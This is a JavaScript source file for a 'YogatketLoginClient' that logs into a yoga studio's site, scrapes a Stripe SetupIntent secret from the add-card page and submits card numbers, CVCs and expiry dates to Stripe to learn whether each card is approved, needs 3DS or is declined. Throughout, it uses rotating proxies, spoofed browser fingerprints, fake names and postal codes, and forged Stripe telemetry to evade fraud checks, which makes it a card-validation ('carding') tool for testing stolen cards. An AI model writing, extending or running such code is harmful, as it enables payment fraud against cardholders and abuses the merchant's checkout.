import got from 'got';
import { CookieJar } from 'tough-cookie';
import { fingerprintGenerator } from '../../utils/FingerprintGenerator.js';
import { proxyAgentFactory } from '../http/ProxyAgentFactory.js';
import { fakeDataService } from '../../utils/FakeDataService.js';

/**
 * Yogateket Login Client (Auth 3)
 * Uses existing account login instead of register page scraping
 * Flow: Login -> Get session cookies -> Navigate to /account/card/new -> Extract SetupIntent -> Confirm
 * 
 * Uses got library for native cookie jar + proxy support
 */
export class YogatketLoginClient {
    constructor(siteConfig, options = {}) {
        this.site = siteConfig;
        this.proxyManager = options.proxyManager || null;
        this.timeout = 30000;
        this.maxRetries = 3;
    }

    async getProxyAgent() {
        if (this.proxyManager && this.proxyManager.isEnabled()) {
            const proxy = await this.proxyManager.getNextProxy();
            if (proxy) {
                return proxyAgentFactory.create(proxy);
            }
        }
        return null;
    }

    generateFakeUser() {
        return fakeDataService.generateFakeUser();
    }

    generateUUID() {
        return fakeDataService.generateUUID();
    }

    extractCsrfToken(html) {
        const match = html.match(/<input name="_token" type="hidden" value="([^"]+)"/);
        return match ? match[1] : null;
    }

    extractSetupIntentSecret(html) {
        const match = html.match(this.site.patterns.setupIntentSecret);
        if (!match) return null;
        
        const setiSecret = match[1];
        const setiId = setiSecret.split('_secret_')[0] || '';
        
        if (!setiId || !setiSecret) return null;
        
        return { setiId, setiSecret };
    }

    async validate(cardInfo) {
        const fingerprint = fingerprintGenerator.generateFingerprint();
        const fakeUser = this.generateFakeUser();
        const proxyAgent = await this.getProxyAgent();
        const cookieJar = new CookieJar();

        const session = got.extend({
            timeout: { request: this.timeout },
            cookieJar,
            throwHttpErrors: false,
            followRedirect: false,
            ...(proxyAgent && { agent: { https: proxyAgent, http: proxyAgent } })
        });

        for (let retry = 0; retry <= this.maxRetries; retry++) {
            try {
                // Step 1: GET /login to extract CSRF token
                const loginPageUrl = `${this.site.baseUrl}/login`;
                const r1 = await session(loginPageUrl, {
                    headers: {
                        'User-Agent': fingerprint.userAgent,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': fingerprint.language.acceptLanguage,
                    }
                });

                if (r1.statusCode !== 200) {
                    if (retry < this.maxRetries) continue;
                    return { success: false, error: 'LOGIN_PAGE_FETCH_FAILED' };
                }

                const csrfToken = this.extractCsrfToken(r1.body);
                if (!csrfToken) {
                    if (retry < this.maxRetries) continue;
                    return { success: false, error: 'CSRF_TOKEN_NOT_FOUND' };
                }

                // Step 2: POST /login with credentials
                const loginData = new URLSearchParams({
                    '_token': csrfToken,
                    'email': this.site.credentials.email,
                    'password': this.site.credentials.password,
                    'remember': 'on'
                });

                const r2 = await session.post(loginPageUrl, {
                    body: loginData.toString(),
                    headers: {
                        'User-Agent': fingerprint.userAgent,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': fingerprint.language.acceptLanguage,
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': this.site.baseUrl,
                        'Referer': loginPageUrl
                    }
                });

                // Follow redirect manually to capture all cookies
                if (r2.statusCode === 302 || r2.statusCode === 301) {
                    const redirectUrl = r2.headers['location'];
                    const fullRedirectUrl = redirectUrl.startsWith('http') 
                        ? redirectUrl 
                        : `${this.site.baseUrl}${redirectUrl}`;
                    
                    await session(fullRedirectUrl, {
                        headers: {
                            'User-Agent': fingerprint.userAgent,
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Language': fingerprint.language.acceptLanguage,
                            'Referer': loginPageUrl
                        },
                        followRedirect: true
                    });
                }

                // Check if login was successful by checking cookies
                const cookies = await cookieJar.getCookies(this.site.baseUrl);
                if (cookies.length < 2) {
                    if (retry < this.maxRetries) continue;
                    return { success: false, error: 'LOGIN_FAILED' };
                }

                // Step 3: GET /account/card/new to extract SetupIntent secret
                const r3 = await session(this.site.addCardUrl, {
                    headers: {
                        'User-Agent': fingerprint.userAgent,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': fingerprint.language.acceptLanguage,
                        'Referer': `${this.site.baseUrl}/account`
                    },
                    followRedirect: true
                });

                if (r3.statusCode !== 200) {
                    if (retry < this.maxRetries) continue;
                    return { success: false, error: 'ADD_CARD_PAGE_FETCH_FAILED' };
                }

                const setupIntent = this.extractSetupIntentSecret(r3.body);
                if (!setupIntent) {
                    if (r3.body.includes('Sign in') || r3.body.includes('/login')) {
                        if (retry < this.maxRetries) continue;
                        return { success: false, error: 'SESSION_EXPIRED' };
                    }
                    if (retry < this.maxRetries) continue;
                    return { success: false, error: 'SETI_SECRET_NOT_FOUND' };
                }

                // Step 4: POST to Stripe setup_intents confirm
                const stripeIds = fingerprint.stripeIds;
                const timeOnPage = Math.floor(Math.random() * 900000) + 100000;
                const clientSessionId = this.generateUUID();
                const postalCode = fakeDataService.generatePostalCode();

                const data = new URLSearchParams({
                    'payment_method_data[type]': 'card',
                    'payment_method_data[billing_details][name]': fakeUser.first,
                    'payment_method_data[billing_details][address][postal_code]': postalCode,
                    'payment_method_data[card][number]': cardInfo.number,
                    'payment_method_data[card][cvc]': cardInfo.cvc,
                    'payment_method_data[card][exp_month]': cardInfo.expMonth,
                    'payment_method_data[card][exp_year]': cardInfo.expYear,
                    'payment_method_data[guid]': stripeIds.guid,
                    'payment_method_data[muid]': stripeIds.muid,
                    'payment_method_data[sid]': stripeIds.sid,
                    'payment_method_data[payment_user_agent]': 'stripe.js/8c194b4c2c; stripe-js-v3/8c194b4c2c; card-element',
                    'payment_method_data[referrer]': this.site.baseUrl,
                    'payment_method_data[time_on_page]': String(timeOnPage),
                    'payment_method_data[client_attribution_metadata][client_session_id]': clientSessionId,
                    'payment_method_data[client_attribution_metadata][merchant_integration_source]': 'elements',
                    'payment_method_data[client_attribution_metadata][merchant_integration_subtype]': 'card-element',
                    'payment_method_data[client_attribution_metadata][merchant_integration_version]': '2017',
                    'expected_payment_method_type': 'card',
                    'use_stripe_sdk': 'true',
                    'key': this.site.pkKey,
                    'client_attribution_metadata[client_session_id]': clientSessionId,
                    'client_attribution_metadata[merchant_integration_source]': 'elements',
                    'client_attribution_metadata[merchant_integration_subtype]': 'card-element',
                    'client_attribution_metadata[merchant_integration_version]': '2017',
                    'client_secret': setupIntent.setiSecret
                });

                const r4 = await got.post(
                    `https://api.stripe.com/v1/setup_intents/${setupIntent.setiId}/confirm`,
                    {
                        body: data.toString(),
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Accept': 'application/json',
                            'Accept-Language': 'en-US,en;q=0.5',
                            'Origin': 'https://js.stripe.com',
                            'Referer': 'https://js.stripe.com/',
                            'User-Agent': fingerprint.userAgent,
                        },
                        timeout: { request: this.timeout },
                        throwHttpErrors: false,
                        ...(proxyAgent && { agent: { https: proxyAgent, http: proxyAgent } })
                    }
                );

                let responseData;
                try {
                    responseData = JSON.parse(r4.body);
                } catch {
                    responseData = r4.body;
                }

                // Check for Stripe error in response
                if (responseData?.error) {
                    const error = responseData.error;
                    return {
                        success: false,
                        approved: false,
                        message: error.message || 'Card declined',
                        declineCode: error.decline_code || error.code || 'unknown',
                        raw: r4.body
                    };
                }

                // Check for successful or 3DS required
                const status = responseData?.status;
                const isSuccess = status === 'succeeded';
                const is3DS = status === 'requires_action' || status === 'requires_confirmation';

                return {
                    success: true,
                    approved: isSuccess || is3DS,
                    status: is3DS ? '3DS_REQUIRED' : (isSuccess ? 'APPROVED' : status),
                    message: is3DS ? '3DS Required' : (isSuccess ? 'APPROVED' : status),
                    data: responseData,
                    raw: r4.body
                };

            } catch (error) {
                if (retry < this.maxRetries) continue;
                if (error.code === 'ETIMEDOUT') {
                    return { success: false, error: 'TIMEOUT' };
                }
                return { success: false, error: error.message };
            }
        }

        return { success: false, error: 'MAX_RETRIES_EXCEEDED' };
    }
}
